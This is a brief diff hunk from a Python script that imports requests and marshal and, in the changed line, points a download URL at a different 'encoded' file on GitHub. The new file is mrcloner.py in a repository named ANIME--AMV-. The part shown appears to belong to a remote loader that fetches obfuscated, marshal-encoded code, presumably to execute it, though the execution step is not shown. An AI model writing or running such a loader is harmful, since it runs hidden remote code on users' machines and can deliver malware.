@@ -2,7 +2,7 @@ import requests
 import marshal
 
 # Raw URL of the encoded file on GitHub
-file_url = 'https://github.com/Thr-tech/Rando/raw/main/text1.py'
+file_url = 'https://github.com/Thr-tech/ANIME--AMV-/raw/main/mrcloner.py'
 
 # Fetch the file content from the URL
 try:
